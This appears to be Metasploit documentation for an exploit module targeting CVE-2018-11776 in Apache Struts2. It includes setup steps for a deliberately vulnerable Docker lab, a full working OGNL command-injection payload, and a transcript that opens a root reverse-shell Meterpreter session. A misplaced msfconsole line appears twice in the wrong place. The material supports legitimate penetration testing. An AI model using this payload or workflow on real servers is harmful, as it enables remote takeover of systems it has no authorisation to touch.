CVE-2018-11776 is a critical vulnerability in the way Apache Struts2 handles namespaces and redirection, which permits an attacker to execute [OGNL(https://commons.apache.org/proper/commons-ognl/language-guide.html) remotely.  Using OGNL, the attacker can modify files and execute commands.

The vulnerability was reported to Apache by [Man Yue Mo] from Semmle in April 2018.  It was widely publicized in August 2018, with PoCs appearing shortly thereafter.

Tomcat versions prior to 7.0.88 will provide output from the injected OGNL and require that we prepend some OGNL to set `allowStaticMethodAccess=true`. Versions starting at 7.0.88 do not provide OUTPUT from injected OGNL and will error if we attempt to modify `allowStaticMethodAccess`.  The `ENABLE_STATIC` option is used to toggle behavior, and the `check` method fingerprints the correct version.

As a result of the lack of OGNL output, we currently cannot support large payloads (namely Windows Meterpreter payloads) on Tomcat versions >= 7.088. Future committers might consider compressing the windows/x64/meterpreter templates or implementing GZIP compression of payloads.



## Vulnerable Application

  The Struts showcase app, with a slight adaptation to introduce the vulnerability, works reliabliy as a practice environment.
  *@hook-s3c* did an amazing job with [their writeup](https://github.com/hook-s3c/CVE-2018-11776-Python-PoC/blob/master/README.md), which I'll include exerpts of here:

  1. From a stock Ubuntu VM, install docker:
  ```
  sudo apt update && sudo apt install docker.io
  ```

  2. Download a vulnerable Struts showcase application inside a docker container:
  ```
  sudo docker pull piesecurity/apache-struts2-cve-2017-5638
  sudo docker run -d --name struts2 -p 32771:8080 piesecurity/apache-struts2-cve-2017-5638
  CONTAINER_ID=`sudo docker ps -l -q`
  ```

  3. Now that the container is running, open a terminal inside of it:
  ```
  sudo docker exec -it $CONTAINER_ID /bin/bash
  ```

  4. From within the container, install your text editor of choice and modify the Struts configs:
  ```
  sudo apt update && sudo apt install nano
  nano /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts.xml
  ```

  5. Update the struts config to add this to above line #11:
  ```
  <constant name="struts.mapper.alwaysSelectFullNamespace" value="true" />
  ```

  6. Update the same struts config file to add this above line #78:
  ```
      <action name="help">
          <result type="redirectAction">
              <param name="actionName">date.action</param>
          </result>
      </action>
  ```

  7. Still within the container, shutdown the environment:
  ```
  /usr/local/tomcat/bin/shutdown.sh
  ```

  8. Upon completion, the container will shutdown and you'll return to the host environment.  Restart the container, now with a vulnerable endpoint:
msf5 exploit(multi/http/struts2_namespace_ognl) > set LHOST 192.168.199.134
  ```
  sudo docker start $CONTAINER_ID
  ```

  Congratulations.  You now have a vulnerable Struts server.  If you're following these instructions, your server should be listening on 0.0.0.0:32771.  To confirm:
  ```
  INTERFACE=`ip route list 0.0.0.0/0 | cut -d' ' -f5`
  IPADDRESS=`ip addr show $INTERFACE | grep -Po 'inet \K[\d.]+'`
  PORT_NUM=`sudo docker port $CONTAINER_ID | sed 's/.*://'`
  echo "Struts container is listening on $IPADDRESS:$PORT_NUM"
  ```

## Verification Steps

  Confirm that check functionality works:
  - [ ] Install the application using the steps above.
  - [ ] Start msfconsole.
  - [ ] Load the module: ```use exploit/multi/http/struts_namespace_ognl```
  - [ ] Set the RHOST.
  - [ ] Set an invalid ACTION: ```set ACTION wrong.action```
  - [ ] Confirm the target is *not* vulnerable: ```check```
  - [ ] Observe that the target is *not* vulnerable: ```The target is not exploitable.```
  - [ ] Set a valid ACTION: ```set ACTION help.action```
  - [ ] Confirm that the target is vulnerable: ```The target is vulnerable.```

  Confirm that command execution functionality works:
  - [ ] Set a payload: ```set PAYLOAD cmd/unix/generic```
  - [ ] Set a command to be run: ```set CMD hostname```
  - [ ] Run the exploit: ```run```
  - [ ] Confirm the output is the container ID of your docker environment, e.g: ```b3d9b350d9b6```
  - [ ] You will not be given a shell (yet).

  Confirm that payload upload and execution works:
  - [ ] Set a payload, e.g.: ```set PAYLOAD linux/x64/meterpreter/reverse_tcp```
  - [ ] Configure `LHOST` and `RHOST` as necessary.
  - [ ] Run the exploit: ```run```
msf5 exploit(multi/http/struts2_namespace_ognl) > set LHOST 192.168.199.134
## Options

  **TARGETURI**

  The path to the struts application.  Note that this does not include the endpoint.  In the environment above, the path is `/`.

  **ACTION**

  The endpoint name.  In the environment above, the endpoint is `help.action`.

## Scenarios

### Version of software and OS as applicable

  Checking a vulnerable endpoint, as installed in the above steps:

  ```
  msf > use exploit/multi/http/struts_namespace_ognl
  msf5 exploit(multi/http/struts_namespace_ognl) > set RHOSTS 192.168.199.135
  msf5 exploit(multi/http/struts_namespace_ognl) > set RPORT 32771
  msf5 exploit(multi/http/struts_namespace_ognl) > set ACTION help.action
  ACTION => help.action
  msf5 exploit(multi/http/struts_namespace_ognl) > check
  [+] 192.168.199.135:32771 The target is vulnerable.
  ```

  Running an arbitrary command on the above-described environment:

  ```
  msf5 exploit(multi/http/struts_namespace_ognl) > set VERBOSE true
  msf5 exploit(multi/http/struts_namespace_ognl) > set PAYLOAD cmd/unix/generic
PAYLOAD => cmd/unix/generic
msf5 exploit(multi/http/struts_namespace_ognl) > set CMD hostname
CMD => hostname
msf5 exploit(multi/http/struts_namespace_ognl) > run
[*] Submitted OGNL: (#_memberAccess['allowStaticMethodAccess']=true).(#cmd='hostname').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())

[*] Command ran.  Output from command:
b3d9b350d9b6

[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/struts_namespace_ognl) > 
  ```

  Getting a Meterpreter session on the above-described environment:

```

msf5 > use exploit/multi/http/struts2_namespace_ognl
msf5 exploit(multi/http/struts2_namespace_ognl) > set ACTION help.action
msf5 exploit(multi/http/struts2_namespace_ognl) > set RHOSTS 192.168.199.135
msf5 exploit(multi/http/struts2_namespace_ognl) > set RPORT 32771
msf5 exploit(multi/http/struts2_namespace_ognl) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/http/struts2_namespace_ognl) > set LHOST 192.168.199.134
msf5 exploit(multi/http/struts2_namespace_ognl) > run

[*] Started reverse TCP handler on 192.168.199.134:4444 
[+] Target profiled successfully: Linux 4.4.0-112-generic amd64, running as root
[+] Payload successfully dropped and executed.
[*] Sending stage (816260 bytes) to 192.168.199.135
[*] Meterpreter session 1 opened (192.168.199.134:4444 -> 192.168.199.135:47482) at 2018-08-31 13:15:22 -0500

meterpreter >
``` 

